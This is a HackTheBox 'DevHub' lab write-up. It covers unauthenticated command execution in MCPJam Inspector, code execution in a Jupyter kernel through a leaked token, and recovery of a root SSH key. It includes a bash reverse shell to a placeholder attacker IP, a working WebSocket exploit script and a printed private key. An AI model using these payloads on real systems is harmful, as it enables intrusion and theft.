# HackTheBox: DevHub Write-up

## Enumeration

I started with a full TCP port scan:

```bash
nmap -sSVC -A -p- -Pn <TARGET_IP>
```

The scan showed SSH, HTTP, and an additional web service on port 6274:

```text
22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu
80/tcp   open  http      nginx 1.18.0 (Ubuntu)
6274/tcp open  http      MCPJam Inspector
```

The website redirects to `devhub.htb`, so I added the hostname to `/etc/hosts`. Port 6274 serves MCPJam Inspector and exposes the `/api/mcp/connect` endpoint.

## Initial Foothold: MCPJam Inspector Command Execution

The unauthenticated connect endpoint accepts a command and its arguments. I used it to launch a reverse shell. First, encode the callback command and start a listener:

```bash
printf 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64 -w0
nc -lvnp 4444
```

Send the request with the generated Base64 value:

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{
    "serverConfig": {
      "command": "sh",
      "args": ["-c", "echo <BASE64_PAYLOAD> | base64 -d | bash"],
      "env": {}
    },
    "serverId": "shell"
  }'
```

The resulting shell runs as `mcp-dev`.

## User Ownership: Jupyter Kernel Access

While enumerating running processes, I found a JupyterLab instance bound to localhost on port 8888, running as `analyst`. Its command line exposed the token `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`. I used it to inspect the Jupyter API and identify an active kernel:

```bash
ps aux | grep -E 'jupyter|opsmcp'
curl -s 'http://127.0.0.1:8888/api/sessions?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' | jq
```

The active kernel ID was `9e4a1ee3-f618-4491-b5eb-23a9981cee7c`. I used it with the token to open the kernel's WebSocket channel and submit a Jupyter `execute_request`. The following proof of concept reads `/home/analyst/user.txt`:

```python
import base64
import json
import os
import socket
import struct
import sys
import time
import uuid

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL_ID = "9e4a1ee3-f618-4491-b5eb-23a9981cee7c"

key = base64.b64encode(os.urandom(16)).decode()
request = (
    f"GET /api/kernels/{KERNEL_ID}/channels?token={TOKEN} HTTP/1.1\r\n"
    "Host: localhost:8888\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    "Sec-WebSocket-Version: 13\r\n\r\n"
)

sock = socket.socket()
sock.settimeout(12)
sock.connect(("127.0.0.1", 8888))
sock.sendall(request.encode())
response = sock.recv(4096)
if b"101 Switching Protocols" not in response:
    print("[-] WebSocket handshake failed")
    sys.exit(1)

code = "import os\nprint(os.popen('cat /home/analyst/user.txt 2>&1').read())\n"
message = json.dumps({
    "header": {
        "msg_id": str(uuid.uuid4()),
        "msg_type": "execute_request",
        "username": "mcp-dev",
        "session": str(uuid.uuid4()),
        "version": "5.3",
    },
    "parent_header": {},
    "metadata": {},
    "content": {"code": code, "silent": False, "store_history": False},
}).encode()

mask = os.urandom(4)
length = len(message)
frame = bytearray([0x81])
if length < 126:
    frame.append(0x80 | length)
elif length < 65536:
    frame.append(0x80 | 126)
    frame.extend(struct.pack("!H", length))
else:
    frame.append(0x80 | 127)
    frame.extend(struct.pack("!Q", length))
frame.extend(mask)
frame.extend(byte ^ mask[index % 4] for index, byte in enumerate(message))
sock.sendall(frame)

for _ in range(8):
    try:
        data = sock.recv(8192)
        if data:
            print(data.decode("utf-8", errors="replace"))
    except socket.timeout:
        break
    time.sleep(0.5)
sock.close()
```

The kernel returned the user flag; its value is intentionally omitted.

## Privilege Escalation: OpsMCP SSH Key Recovery

Process enumeration also revealed a local OpsMCP service on port 5000 running with elevated privileges. The service exposed a `ssh_keys` tool. I used the API key `opsmcp_secret_key_4f5a6b7c8d9e0f1a` to request the recovery key and save it locally:

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  --data '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"ssh_keys","arguments":{"target":"ssh_keys","confirm":true}}}' \
  | jq -r '.root_private_key' > id_rsa

chmod 600 id_rsa
ssh -i id_rsa root@<TARGET_IP>
cat /root/root.txt
```

The recovered root SSH private key was:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----
```

SSH as `root` provided access to the root flag; its value is intentionally omitted.

## Attack Path

```text
Nmap → devhub.htb and MCPJam Inspector on port 6274
  ↓
Unauthenticated /api/mcp/connect command execution → shell as mcp-dev
  ↓
Jupyter token and active kernel → code execution as analyst → user flag
  ↓
OpsMCP API key → SSH recovery-key disclosure
  ↓
SSH as root
```

## References

- [MCPJam Inspector](https://github.com/MCPJam/inspector)
- [Jupyter Server REST API documentation](https://jupyter-server.readthedocs.io/en/latest/developers/rest-api.html)

> Replace the target and callback IPs with your HTB VPN values. Flag values are intentionally omitted.
